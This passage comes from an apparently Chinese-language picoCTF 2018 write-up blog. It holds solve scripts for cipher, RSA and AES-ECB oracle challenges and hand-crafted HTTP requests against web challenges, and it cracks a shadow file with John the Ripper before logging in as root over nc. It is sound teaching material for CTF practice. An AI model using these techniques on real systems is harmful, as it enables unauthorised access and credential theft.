class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line">  </span><br><span class="line">  FILE *f = fopen(<span class="string">"flag.txt"</span>,<span class="string">"r"</span>);</span><br><span class="line">  <span class="keyword">if</span> (f == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(flag,FLAGSIZE_MAX,f);</span><br><span class="line">  signal(SIGSEGV, sigsegv_handler);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">gid_t</span> gid = getegid();</span><br><span class="line">  setresgid(gid, gid, gid);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (argc &gt; <span class="number">1</span>) &#123;</span><br><span class="line">    vuln(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Thanks! Received: %s"</span>, argv[<span class="number">1</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"This program takes 1 argument.\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Cryptography"><a href="#Cryptography" class="headerlink" title="Cryptography"></a>Cryptography</h1><h2 id="Crypto-Warmup-1"><a href="#Crypto-Warmup-1" class="headerlink" title="Crypto Warmup 1"></a>Crypto Warmup 1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> <span class="string">"picoCTF&#123;%s&#125;"</span>%<span class="string">''</span>.join(map(<span class="keyword">lambda</span> x:chr((ord(x[<span class="number">0</span>])-ord(x[<span class="number">1</span>]))%<span class="number">26</span>+ord(<span class="string">'a'</span>)),zip(<span class="string">'llkjmlmpadkkc'</span>,<span class="string">'thisisalilkey'</span>))).upper()</span><br><span class="line">picoCTF&#123;SECRETMESSAGE&#125;</span><br></pre></td></tr></table></figure><h2 id="caesar-cipher-2"><a href="#caesar-cipher-2" class="headerlink" title="caesar cipher 2"></a>caesar cipher 2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>.join(map(<span class="keyword">lambda</span> x:chr((ord(x)+<span class="number">32</span>)%<span class="number">0xff</span>),<span class="string">'PICO#4&amp;[C!ESA2?#I0H%R3?JU34?A2%N4?S%C5R%]'</span>))</span><br><span class="line"><span class="comment"># 'picoCTF&#123;cAesaR_CiPhErS_juST_aREnT_sEcUrE&#125;'</span></span><br></pre></td></tr></table></figure><h2 id="hertz"><a href="#hertz" class="headerlink" title="hertz"></a>hertz</h2><p>替换密码。</p><p>在线工具：</p><ul><li><a href="https://www.guballa.de/substitution-solver" target="_blank" rel="noopener">https://www.guballa.de/substitution-solver</a> </li><li><a href="https://quipqiup.com/" target="_blank" rel="noopener">https://quipqiup.com/</a> </li></ul><p><img src="1541076904847.png" alt="1541076904847"></p><h2 id="blaise’s-cipher"><a href="#blaise’s-cipher" class="headerlink" title="blaise’s cipher"></a>blaise’s cipher</h2><p>在线解密即可：<a href="https://www.dcode.fr/vigenere-cipher" target="_blank" rel="noopener">https://www.dcode.fr/vigenere-cipher</a> 。逐步得到KEY长度为4，KEY为<code>FLAG</code></p><p><code>picoCTF{v1gn3r3_c1ph3rs_ar3n7_bad_901e13a1}</code> </p><p>## </p><h2 id="Safe-RSA"><a href="#Safe-RSA" class="headerlink" title="Safe RSA"></a>Safe RSA</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2,binascii</span><br><span class="line">e=<span class="number">3</span></span><br><span class="line">c=<span class="number">2205316413931134031046440767620541984801091216351222789180593875373829950860542792110364325728088504479780803714561464250589795961097670884274813261496112882580892020487261058118157619586156815531561455215290361274334977137261636930849125</span></span><br><span class="line">m=gmpy2.iroot(c,e)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">print</span> binascii.unhexlify(hex(m).strip(<span class="string">'lL'</span>)[<span class="number">2</span>:])</span><br><span class="line"><span class="comment"># picoCTF&#123;e_w4y_t00_sm411_9f5d2464&#125;</span></span><br></pre></td></tr></table></figure><h2 id="【X】Super-Safe-RSA"><a href="#【X】Super-Safe-RSA" class="headerlink" title="【X】Super Safe RSA"></a>【X】Super Safe RSA</h2><p>参考<a href="https://findneo.github.io/180727rsa-attack/#广播攻击">RSA的广播攻击</a> 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># __author__ = findneo</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2,re</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> connect</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line">c=[]</span><br><span class="line">n=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'buf'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">        j=i.strip().split(<span class="string">' '</span>)</span><br><span class="line">        c.append(int(j[<span class="number">0</span>]))</span><br><span class="line">        n.append(int(j[<span class="number">1</span>]))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"mytag:"</span>,len(c)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'buf'</span>,<span class="string">'a'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">while</span> len(c)&lt;<span class="number">65538</span>:</span><br><span class="line">        r=connect(<span class="string">'2018shell2.picoctf.com'</span>,<span class="number">24039</span>)</span><br><span class="line">        res=r.recv()</span><br><span class="line">        g=re.findall(<span class="string">'c: (\d+)\nn: (\d+)\n.*'</span>,res)[<span class="number">0</span>]</span><br><span class="line">        f.write(<span class="string">' '</span>.join(g)+<span class="string">'\n'</span>)</span><br><span class="line">        c.append(g[<span class="number">0</span>])</span><br><span class="line">        n.append(g[<span class="number">1</span>])</span><br><span class="line">        r.close()</span><br><span class="line">        <span class="comment"># sleep(0.1)</span></span><br><span class="line">        <span class="keyword">if</span> len(c)%<span class="number">1000</span>==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'mytag:'</span>,len(c)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GCRT</span><span class="params">(mi, ai)</span>:</span></span><br><span class="line">    <span class="comment"># mi,ai分别表示模数和取模后的值,都为列表结构</span></span><br><span class="line">    <span class="keyword">assert</span> (isinstance(mi, list) <span class="keyword">and</span> isinstance(ai, list))</span><br><span class="line">    curm, cura = mi[<span class="number">0</span>], ai[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> (m, a) <span class="keyword">in</span> zip(mi[<span class="number">1</span>:], ai[<span class="number">1</span>:]):</span><br><span class="line">        d = gmpy2.gcd(curm, m)</span><br><span class="line">        c = a - cura</span><br><span class="line">        <span class="keyword">assert</span> (c % d == <span class="number">0</span>) <span class="comment">#不成立则不存在解</span></span><br><span class="line">        K = c / d * gmpy2.invert(curm / d, m / d)</span><br><span class="line">        cura += curm * K</span><br><span class="line">        curm = curm * m / d</span><br><span class="line">        cura %= curm</span><br><span class="line">    <span class="keyword">return</span> (cura % curm, curm) <span class="comment">#(解,最小公倍数)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> GCRT(n,c)[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><h2 id="HEEEEEEERE’S-Johnny"><a href="#HEEEEEEERE’S-Johnny" class="headerlink" title="HEEEEEEERE’S Johnny!"></a>HEEEEEEERE’S Johnny!</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/wordlists/rockyou.txt.gz .</span><br><span class="line">gunzip rockyou.txt.gz</span><br><span class="line">unshadow passwd shadow &gt; unshadowes.txt</span><br><span class="line">john --wordlist=~/mywordlists/rockyou.txt --rules unshadowes.txt</span><br><span class="line">Warning: detected <span class="built_in">hash</span> <span class="built_in">type</span> <span class="string">"sha512crypt"</span>, but the string is also recognized as <span class="string">"crypt"</span></span><br><span class="line">Use the <span class="string">"--format=crypt"</span> option to force loading these as that <span class="built_in">type</span> instead</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (sha512crypt, crypt(3) <span class="variable">$6</span>$ [SHA512 128/128 AVX 2x])</span><br><span class="line">Press <span class="string">'q'</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">thematrix        (root)</span><br><span class="line">1g 0:00:00:16 DONE (2018-10-10 10:04) 0.06002g/s 660.7p/s 660.7c/s 660.7C/s kenya..saavedra</span><br><span class="line">Use the <span class="string">"--show"</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br><span class="line"></span><br><span class="line">nc 2018shell2.picoctf.com 38860</span><br><span class="line">Username: root</span><br><span class="line">Password: thematrix</span><br><span class="line">picoCTF&#123;J0hn_1<span class="variable">$_R1pp3d_4e5aa29e</span>&#125;</span><br></pre></td></tr></table></figure><h2 id="rsa-madlibs"><a href="#rsa-madlibs" class="headerlink" title="rsa-madlibs"></a>rsa-madlibs</h2><p>回答一些简单的RSA知识。可以参考<a href="https://findneo.github.io/180727rsa-attack/">CTF中常见的RSA相关问题总结</a> 一文。</p><p>发现一个做这类题目的好方法，<code>python solve.py | nc 2018shell2.picoctf.com 18148</code> ，不到必要就不去处理各种奇怪的数据。</p><p><code>picoCTF{d0_u_kn0w_th3_w@y_2_RS@_b38be18a}</code> </p><h2 id="SpyFi"><a href="#SpyFi" class="headerlink" title="SpyFi"></a>SpyFi</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2 -u</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">agent_code = <span class="string">"""flag"""</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span><span class="params">(message)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(message) % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">        message = message + <span class="string">'0'</span>*(<span class="number">16</span> - len(message)%<span class="number">16</span> )</span><br><span class="line">    <span class="keyword">return</span> message</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(key, plain)</span>:</span></span><br><span class="line">    cipher = AES.new( key.decode(<span class="string">'hex'</span>), AES.MODE_ECB )</span><br><span class="line">    <span class="keyword">return</span> cipher.encrypt(plain).encode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line">welcome = <span class="string">"Welcome, Agent 006!"</span></span><br><span class="line"><span class="keyword">print</span> welcome</span><br><span class="line"></span><br><span class="line">sitrep = raw_input(<span class="string">"Please enter your situation report: "</span>)</span><br><span class="line">message = <span class="string">"""Agent,</span></span><br><span class="line"><span class="string">Greetings. My situation report is as follows:</span></span><br><span class="line"><span class="string">&#123;0&#125;</span></span><br><span class="line"><span class="string">My agent identifying code is: &#123;1&#125;.</span></span><br><span class="line"><span class="string">Down with the Soviets,</span></span><br><span class="line"><span class="string">006</span></span><br><span class="line"><span class="string">"""</span>.format( sitrep, agent_code )</span><br><span class="line"></span><br><span class="line">message = pad(message)</span><br><span class="line"><span class="keyword">print</span> encrypt( <span class="string">"""key"""</span>, message )</span><br></pre></td></tr></table></figure><p>AES的ECB模式存在选择明文攻击。</p><p>当输入9个字节时，message中flag之外的部分长度为122个字节，密文长度为160个字节；当输入10个字节时，密文长度为176个字节。说明flag长度为160-122=38个字节。</p><p><img src="1538925911862.png" alt="1538925911862"></p><p>将message分组输出，看到爆破flag的机会。</p><p><img src="1538929635797.png" alt="1538929635797"></p><p>写完代码验证可行。</p><p><img src="1538934008777.png" alt="1538934008777"></p><p>最后成果：</p><p><code>picoCTF{@g3nt6_1$_th3_c00l3$t_8124762}</code> </p><p><img src="1538938179361.png" alt="1538938179361"></p><p><img src="1538938605546.png" alt="1538938605546"></p><p>全部代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">part_msg</span><span class="params">(message,part_length=<span class="number">16</span>)</span>:</span></span><br><span class="line">sl=len(message)</span><br><span class="line">pl=part_length </span><br><span class="line">m=[message[pl*i:min(sl,pl*i+pl)] <span class="keyword">for</span> i <span class="keyword">in</span> range(sl/pl+(sl%pl&gt;<span class="number">0</span>))]</span><br><span class="line"><span class="keyword">return</span> m</span><br><span class="line">msg=[<span class="string">'Agent,\nGreetings. My situation report is as follows:\n'</span>,<span class="string">'\nMy agent identifying code is: '</span>,<span class="string">'.\nDown with the Soviets,\n006\n'</span>,]</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> connect</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span><span class="params">()</span>:</span></span><br><span class="line">cnt=<span class="number">0</span></span><br><span class="line">flag=<span class="string">'picoCTF&#123;@'</span></span><br><span class="line"><span class="comment"># sitrep,agent_code='',''</span></span><br><span class="line"><span class="comment"># message =msg[0] +sitrep+msg[1]+agent_code+msg[2]</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">38</span>-len(flag)):</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> string.printable:</span><br><span class="line"><span class="comment"># print "flag:",i</span></span><br><span class="line">r=connect(<span class="string">"2018shell2.picoctf.com"</span>,<span class="number">37131</span>)</span><br><span class="line">cnt+=<span class="number">1</span>;time.sleep(<span class="number">1</span>)</span><br><span class="line">prompt=r.recvuntil(<span class="string">"report: "</span>)</span><br><span class="line"><span class="comment"># 113 + (11+16+38+10)  + 38 = 226</span></span><br><span class="line">base=<span class="string">'fying code is: '</span>+flag</span><br><span class="line">sitrep=<span class="string">'@'</span>*<span class="number">11</span>+base[<span class="number">-15</span>:]+i+<span class="string">'@'</span>*(<span class="number">38</span>-len(flag)+<span class="number">10</span>)</span><br><span class="line"><span class="comment"># agent_code="#"*38</span></span><br><span class="line"><span class="comment"># message =msg[0] +sitrep+msg[1]+agent_code+msg[2]</span></span><br><span class="line"><span class="comment"># print '\n'.join(map(repr,part_msg(message)))</span></span><br><span class="line">r.sendline(sitrep)</span><br><span class="line">response=r.recv()</span><br><span class="line"><span class="comment"># print len(response)</span></span><br><span class="line">tmp=part_msg(response,<span class="number">32</span>)</span><br><span class="line"><span class="comment"># print len(tmp)</span></span><br><span class="line"><span class="comment"># print '\n'.join(tmp)</span></span><br><span class="line">r.close()</span><br><span class="line"><span class="comment"># print len(msg[0]+sitrep+msg[1]+flag)/16</span></span><br><span class="line"><span class="keyword">if</span> tmp[<span class="number">4</span>]==tmp[len(msg[<span class="number">0</span>]+sitrep+msg[<span class="number">1</span>]+flag)/<span class="number">16</span>]:</span><br><span class="line">flag+=i</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"flag:"</span>,flag,cnt</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"flag:"</span>,time.asctime()</span><br><span class="line">solve()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"flag:"</span>,time.asctime()</span><br></pre></td></tr></table></figure><h1 id="Web-Exploitation"><a href="#Web-Exploitation" class="headerlink" title="Web Exploitation"></a>Web Exploitation</h1><h2 id="Buttons"><a href="#Buttons" class="headerlink" title="Buttons"></a>Buttons</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http://2018shell2.picoctf.com:65107/button2.php --data <span class="string">"123"</span></span><br><span class="line">Well <span class="keyword">done</span>, your flag is: picoCTF&#123;button_button_whose_got_the_button_91f6f39a&#125;</span><br></pre></td></tr></table></figure><h2 id="Artisinal-Handcrafted-HTTP-3"><a href="#Artisinal-Handcrafted-HTTP-3" class="headerlink" title="Artisinal Handcrafted HTTP 3"></a>Artisinal Handcrafted HTTP 3</h2><p>先请求一下login页面：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/login</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: flag.local</span><br></pre></td></tr></table></figure><p>发现表单是这样的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">x-powered-by: Express</span><br><span class="line">content-type: text/html; charset=utf<span class="number">-8</span></span><br><span class="line">content-length: <span class="number">498</span></span><br><span class="line">etag: W/<span class="string">"1f2-UE5AGAqbLVQn1qrfKFRIqanxl9I"</span></span><br><span class="line">date: Sun, <span class="number">07</span> Oct <span class="number">2018</span> <span class="number">18</span>:<span class="number">33</span>:<span class="number">21</span> GMT</span><br><span class="line">connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;link rel=<span class="string">"stylesheet"</span> type=<span class="string">"text/css"</span> href=<span class="string">"main.css"</span> /&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;header&gt;</span><br><span class="line">&lt;h1&gt;Real Business Internal Flag Server&lt;/h1&gt;</span><br><span class="line">&lt;a href=<span class="string">"/login"</span>&gt;Login&lt;/a&gt;</span><br><span class="line">&lt;/header&gt;</span><br><span class="line">&lt;main&gt;</span><br><span class="line">&lt;h2&gt;Log In&lt;/h2&gt;</span><br><span class="line"></span><br><span class="line">&lt;form method=<span class="string">"POST"</span> action=<span class="string">"login"</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"text"</span> name=<span class="string">"user"</span> placeholder=<span class="string">"Username"</span> /&gt;</span><br><span class="line">&lt;input type=<span class="string">"password"</span> name=<span class="string">"pass"</span> placeholder=<span class="string">"Password"</span> /&gt;</span><br><span class="line">&lt;input type=<span class="string">"submit"</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/main&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>再请求登陆：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/login</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: flag.local</span><br><span class="line"><span class="attribute">Content-Length</span>: 38</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">user=realbusinessuser&amp;pass=potoooooooo</span><br></pre></td></tr></table></figure><p>响应：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">302</span> Found</span><br><span class="line"><span class="attribute">x-powered-by</span>: Express</span><br><span class="line"><span class="attribute">set-cookie</span>: real_business_token=PHNjcmlwdD5hbGVydCgid2F0Iik8L3NjcmlwdD4%3D; Path=/</span><br><span class="line"><span class="attribute">location</span>: /</span><br><span class="line"><span class="attribute">vary</span>: Accept</span><br><span class="line"><span class="attribute">content-type</span>: text/plain; charset=utf-8</span><br><span class="line"><span class="attribute">content-length</span>: 23</span><br><span class="line"><span class="attribute">date</span>: Tue, 09 Oct 2018 15:11:46 GMT</span><br><span class="line"><span class="attribute">connection</span>: close</span><br><span class="line"></span><br><span class="line">Found. Redirecting to /</span><br></pre></td></tr></table></figure><p>带上cookie请求：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: flag.local</span><br><span class="line"><span class="attribute">cookie</span>: real_business_token=PHNjcmlwdD5hbGVydCgid2F0Iik8L3NjcmlwdD4%3D; Path=/</span><br></pre></td></tr></table></figure><p>响应：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">x-powered-by</span>: Express</span><br><span class="line"><span class="attribute">content-type</span>: text/html; charset=utf-8</span><br><span class="line"><span class="attribute">content-length</span>: 438</span><br><span class="line"><span class="attribute">etag</span>: W/"1b6-eYJ8DUTdkgByyfWFi6OJJSjopFg"</span><br><span class="line"><span class="attribute">date</span>: Tue, 09 Oct 2018 15:12:57 GMT</span><br><span class="line"><span class="attribute">connection</span>: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;link rel="stylesheet" type="text/css" href="main.css" /&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;header&gt;</span><br><span class="line">            &lt;h1&gt;Real Business Internal Flag Server&lt;/h1&gt;</span><br><span class="line">            &lt;div class="user"&gt;Real Business Employee&lt;/div&gt;</span><br><span class="line">            &lt;a href="/logout"&gt;Logout&lt;/a&gt;</span><br><span class="line">        &lt;/header&gt;</span><br><span class="line">        &lt;main&gt;</span><br><span class="line">            &lt;p&gt;Hello &lt;b&gt;Real Business Employee&lt;/b&gt;!  Today's flag is: &lt;code&gt;picoCTF&#123;0nLY_Us3_n0N_GmO_xF3r_pR0tOcol5_2e14&#125;&lt;/code&gt;.&lt;/p&gt;</span><br><span class="line">        &lt;/main&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h2 id="【X】Secure-Logon"><a href="#【X】Secure-Logon" class="headerlink" title="【X】Secure Logon"></a>【X】Secure Logon</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, url_for, redirect, make_response, flash</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span 